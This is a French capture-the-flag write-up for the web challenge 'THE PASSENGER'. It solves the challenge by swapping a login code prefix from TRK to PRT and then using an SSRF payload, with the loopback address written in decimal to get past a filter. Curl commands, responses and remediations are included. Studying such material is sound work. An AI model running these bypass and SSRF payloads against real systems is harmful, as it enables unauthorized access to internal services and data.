# THE PASSENGER

[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | THE PASSENGER |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Web |
| Difficulté | Non documentée |
| Points | Non documentés |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | HTTP, codes partenaires, SSRF, JSON |
| Validation | Signalement local uniquement (reported) |

## 1. Introduction

Identifier la personne rattachée à l’opération de transport.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

## 2. Énoncé du challenge

- Q3 — Objectif reconstitué de la note ; énoncé intégral de la carte absent.

### Objectif

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

Retrouver l'identité sous laquelle **Thomas Crown** prépare son départ, à partir
de l'espace partenaire Northline Transit et du service de coordination interne.

## 3. Analyse initiale

1 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

### État initial

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

- Cible : `http://172.28.38.2:8080`
- Reçu de transport `recu_northline.png` contenant une référence `NL-24-7K42`
  et un QR pointant vers `/track/TRK.<id>.<integrite>`.
- Le portail partenaire n'accepte pas le préfixe `TRK` mais accepte le même
  identifiant/intégrité avec le préfixe `PRT`.

## 4. Reconnaissance et investigation

### Reconnaissance

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

1. Décodage du QR du reçu :

   ```bash
   zbarimg --raw -q recu_northline.png
   ```

   Résultat : une URL `.../track/TRK.<id>.<integrite>`.

2. Le préfixe `TRK` est refusé par `/login` (« invalide ou expiré »). En
   remplaçant `TRK` par `PRT` — l'intégrité ne dépend que de l'identifiant —
   on obtient une session partenaire valide :

   ```bash
   curl -i -X POST http://172.28.38.2:8080/login \
        -d 'code=PRT.<id>.<integrite>'
   # -> 302 vers /dashboard
   ```

3. Le tableau de bord révèle le compte **Skarvik Marine Services**
   (`partner-1042`) et une carte contenant l'identifiant de session
   (résolution de q:2).

## 5. Identification du mécanisme

Le segment d’intégrité n’est pas lié au préfixe TRK/PRT. Après accès au portail partenaire, l’import de bordereau permet une lecture du service local via une adresse IPv4 numérique. Les questions suivantes utilisent les relations expédition → opération → affectation ; seule l’affectation active est pertinente.

### Interprétation

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

Le portail `/waybills` propose un champ `source_url` qui fait récupérer une URL
par le serveur (SSRF). Les contraintes observées :

- seuls les schémas `http` passent ;
- seul le port `8081` est autorisé ;
- les chaînes littérales `127.0.0.1` et `localhost` sont bloquées.

Contournement : la notation décimale de l'adresse de bouclage
`2130706433` équivaut à `127.0.0.1` mais ne correspond à aucun motif bloqué.

```bash
curl -s -X POST http://172.28.38.2:8080/waybills \
     --cookie 'session=<...>' \
     -d 'source_url=http://2130706433:8081/docs'
```

La réponse est un JSON échappé dans `<pre class="preview">`. La spec `/docs`
expose notamment :

- `/api/shipments/<reference>`
- `/api/operations/<operation>`
- `/api/operations/<operation>/assignments`
- `/flag`

## 6. Exploitation ou résolution

### Exploitation

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

La référence du reçu (`NL-24-7K42`) renvoie l'opération `OP-24-7319` :

```bash
curl -s -X POST http://172.28.38.2:8080/waybills \
     --cookie 'session=<...>' \
     -d 'source_url=http://2130706433:8081/api/shipments/NL-24-7K42'
```

Puis la fiche d'opération détaillée :

```bash
curl -s -X POST http://172.28.38.2:8080/waybills \
     --cookie 'session=<...>' \
     -d 'source_url=http://2130706433:8081/api/operations/OP-24-7319'
```

Structure retournée (valeur de couverture volontairement masquée) :

```json
{
  "classification": "Coordination confidentielle",
  "destination": {
    "final_destination": "Îles d'Aster",
    "location": "Terminal maritime de Skarvik",
    "meeting_point": "Hangar C4 — quai de service nord"
  },
  "operation_id": "OP-24-7319",
  "shipment_reference": "NL-24-7K42",
  "traveller": {
    "cover_name": "<couverture — réponse soumise>",
    "identity": "Thomas Crown",
    "traveller_id": "PAX-2048"
  }
}
```

Le champ `traveller.cover_name` est l'identité de couverture demandée par
l'énoncé. Les 24 autres opérations (`OP-24-1001` à `OP-24-1024`) sont des
expéditions standard sans objet `traveller`, ce qui confirme que
`OP-24-7319` est l'opération d'exfiltration.

### Validation reproductible (sans la réponse)

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

```bash
python3 solveur.py --target http://172.28.38.2:8080 \
  --code PRT.<id>.<integrite> --q3
```

Le script doit afficher :

```
[+] session partenaire : Skarvik Marine Services
[+] opération   : OP-24-7319
[+] expédition  : NL-24-7K42
[+] identité    : Thomas Crown (PAX-2048)
[+] destination : Îles d'Aster
[+] FLAG q:3    : <couverture>
```

Un coéquipier peut vérifier l'exactitude en comparant `traveller.cover_name` à
la valeur attendue par la plateforme, sans que cette valeur n'apparaisse ici.

## 7. Scripts et automatisation

Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.

Les outils partagés sont inventoriés dans [THE GATE](../the-gate/README.md). Les arguments spécifiques à cette question sont ceux des notes historiques.

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Q3 — Objectif reconstitué de la note ; énoncé intégral de la carte absent. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Signalement local uniquement (reported) |

## 9. Difficultés rencontrées

### Chemins qui ont échoué

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

- **Préfixe `TRK` en login** : rejeté, le portail partenaire attend `PRT`.
  L'intégrité étant calculée sur l'identifiant seul, la substitution suffit.
- **`http://127.0.0.1:8081/...` et `http://localhost:8081/...`** : bloqués par
  le filtre anti-loopback.
- **Autres ports** (80, 8000, 8082…) : refusés par la validation de port.
- **Énumération des 25 expéditions `NL-24-41xx`** : aucune ne contient de
  voyageur ; seule la référence du reçu mène à `OP-24-7319`.

## 10. Analyse technique approfondie

Le segment d’intégrité n’est pas lié au préfixe TRK/PRT. Après accès au portail partenaire, l’import de bordereau permet une lecture du service local via une adresse IPv4 numérique. Les questions suivantes utilisent les relations expédition → opération → affectation ; seule l’affectation active est pertinente. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Lier cryptographiquement le type de code à son identifiant ; appliquer une autorisation par opération et affectation. Normaliser et contrôler les adresses résolues avant toute requête serveur et isoler les services internes.

## 12. Conclusion

Identifier la personne rattachée à l’opération de transport. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Signalement local uniquement (reported).

### Leçons

Source : [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt)

- Une intégrité qui ne lie que l'identifiant et pas le préfixe permet de
  changer de contexte (suivi public → espace partenaire).
- Les filtres anti-SSRF par correspondance de chaînes se contournent avec des
  représentations alternatives de l'adresse (décimale, IPv6 mappée).
- La documentation interne exposée (`/docs`) transforme une SSRF aveugle en
  énumération d'API complète.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [writeup-THE-PASSENGER.md](evidence/web-depart-writeup-the-passenger-md.txt) — origine : `web/depart/writeup-THE-PASSENGER.md`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

